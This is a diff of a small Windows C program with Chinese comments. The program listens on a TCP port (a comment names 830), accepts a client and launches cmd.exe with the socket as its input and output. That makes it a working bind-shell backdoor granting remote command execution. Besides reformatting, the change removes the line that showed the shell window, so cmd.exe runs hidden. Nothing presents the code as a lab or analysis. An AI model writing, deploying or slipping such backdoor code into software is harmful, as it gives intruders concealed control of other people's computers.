@@ -7,6 +7,7 @@ int main()
 	WSADATA ws;
 	SOCKET listenFD;
 	int ret;
+	PROCESS_INFORMATION ProcessInformation;
 
 	//初始化wsa
 	WSAStartup(MAKEWORD(2,2),&ws);
@@ -21,19 +22,21 @@ int main()
 	ret=listen(listenFD,2);
 	//如果客户请求830端口，接受连接
 	int iAddrSize = sizeof(server);
-	SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
+
+	SOCKET clientFD=accept(listenFD, (sockaddr *)&server,
+                               &iAddrSize);
 
 	STARTUPINFO si;
-	ZeroMemory(&si,sizeof(si));
+	ZeroMemory(&si, sizeof(si));
 	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
 	si.wShowWindow = SW_HIDE;
-	si.wShowWindow = SW_SHOWNORMAL;
-	
 	si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD;
+
 	char cmdLine[] = "cmd.exe";
-	PROCESS_INFORMATION ProcessInformation;
-	//建立进程	
-	ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
+
+	ret = CreateProcess(NULL, cmdLine, NULL,
+                            NULL, 1, 0, NULL, NULL,
+                            &si, &ProcessInformation);
 	
 	return 0;
 }
